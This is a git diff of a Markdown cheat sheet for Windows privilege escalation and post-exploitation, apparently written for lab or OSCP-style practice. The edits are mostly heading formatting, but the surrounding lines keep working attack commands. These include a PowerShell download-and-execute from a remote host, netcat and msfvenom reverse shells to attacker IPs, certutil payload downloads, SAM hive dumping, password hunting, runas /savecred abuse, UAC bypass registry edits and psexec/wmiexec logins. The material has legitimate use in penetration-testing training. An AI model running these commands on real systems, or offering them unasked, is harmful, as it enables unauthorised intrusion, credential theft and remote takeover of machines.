@@ -1,4 +1,7 @@
-# Downloading Files
+# payloads
+
+## Downloading Files
+
 ```
 #download and execute at the same time
 powershell.exe IEX(New-Object+Net.WebClient).downloadString('http%3a//10.10.14.10/rev.ps1')
@@ -49,7 +52,9 @@ scp user@192.168.1.100:/path/to/file.txt /path/on/local/machine/
 
 echo c:\Users\kohsuke\Desktop\nc.exe 10.10.14.41 4455 -e cmd.exe > reverse.bat
 ```
-# File Permission Exploit
+
+## File Permission Exploit
+
 ```
 # 777 exe file ?
 
@@ -95,7 +100,7 @@ sc start regsvc
 
 ```
 
-# Metasploit Windows Reverse Shell
+## Metasploit Windows Reverse Shell
 
 ```
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4567 -f aspx > letmein.aspx 
@@ -105,7 +110,9 @@ use exploit/multi/handler
 set payload windows/meterpreter/reverse_tcp
 
 ```
-# Manual Windows Reverse Shell
+
+## Manual Windows Reverse Shell
+
 ```
 python3 -m http.server
 
@@ -117,7 +124,9 @@ msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=YOUR_IP LP
 cd C:\Windows\Temp
 certutil -urlcache -f http://YOUR_IP:PORT/filename.exe renamed.exe
 ```
-# Metasploit Windows suggester
+
+## Metasploit Windows suggester
+
 ```
 background
 
@@ -126,15 +135,17 @@ use post/multi/recon/local_exploit_suggester
 run SESSION=1
 ```
 
+## Windows System Enumeration
 
-# Windows System Enumeration 
 ```
 systeminfo
 
 #32bit ? 64bit ? 68bit ?
 wmic os get osarchitecture
 ```
+
 ![image](https://github.com/J4CKMEISTER/Jack-of-All-BL4D3S/assets/78603128/8cfbe647-00a2-4016-86b2-143e539bedde)
+
 ```
 systeminfo | findstr /b /c:"OS Name" /c:"OS Version" /c:"System Type"
 
@@ -149,7 +160,8 @@ wmic logicaldisk get caption,description,providername
 wmic logicaldisk get caption
 ```
 
-# Windows User Enumeration 
+## Windows User Enumeration
+
 ```
 whoami
 
@@ -166,7 +178,8 @@ net localgroup
 net localgroup administrators
 ```
 
-# Windows Network Enumeration 
+## Windows Network Enumeration
+
 ```
 netstat -ano | findstr "LISTEN"
 
@@ -184,7 +197,8 @@ route print
 netstat -ano
 ```
 
-# Windows Password Hunting
+## Windows Password Hunting
+
 ```
 #find 'password' in current directory with extension of txt,ini and config
 findstr /si password *.txt *.ini *.config
@@ -207,7 +221,8 @@ runas /usr:ACCESS\Administrator /savecred cmd /c
 runas /usr:ACCESS\Administrator /savecred "cmd /c C:\Users\security\Desktop\nc.exe 10.10.14.17 4567 -e cmd.exe"
 ```
 
-# Credential Extracting
+## Credential Extracting
+
 ```
 
 reg.exe save hklm\sam C:\xampp\htdocs\oscommerce-2.3.4\sam.save
@@ -241,7 +256,8 @@ type output
 https://blog.harmj0y.net/redteaming/operational-guidance-for-offensive-user-dpapi-abuse/
 ```
 
-# AV Enumeration
+## AV Enumeration
+
 ```
 #Check Window Defender is up or down
 sc query windefend
@@ -257,7 +273,8 @@ netsh firewall show state
 netsh firewall show config
 ```
 
-# Bypass UAC
+## Bypass UAC
+
 ```
 UAC = Prompt ask admin for confirmation yes and no
 
@@ -383,7 +400,8 @@ reg delete "HKCU\Environment" /v "windir" /f
 
 ```
 
-# Read Permissions
+## Read Permissions
+
 ```
 #possible if user is also admin
 icacls C:\Users\Administrator\Desktop\root.txt /grant username:F
@@ -393,13 +411,16 @@ icacls C:\Windows\System32\net.exe /grant username:username:F
 "F" for Full control, "M" for Modify, "R" for Read, "W" for Write, "X" for Execute
 
 ```
-# Finding exe files
+
+## Finding exe files
+
 ```
 where /R c:\windows bash.exe
 where /R c:\windows wsl.exe
 ```
 
-# Login methods
+## Login methods
+
 ```
  psexec.py administrator:'password'@MACHINE_IP
  
@@ -408,15 +429,14 @@ where /R c:\windows wsl.exe
  wmiexec.py administrator:'password'@MACHINE_IP
 ```
 
-# References
+## References
 
 https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
 
-https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html
+https://sushant747.gitbooks.io/total-oscp-guide/content/privilege\_escalation\_windows.html
 
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
 
 https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation
 
 https://github.com/SecWiki/windows-kernel-exploits
-
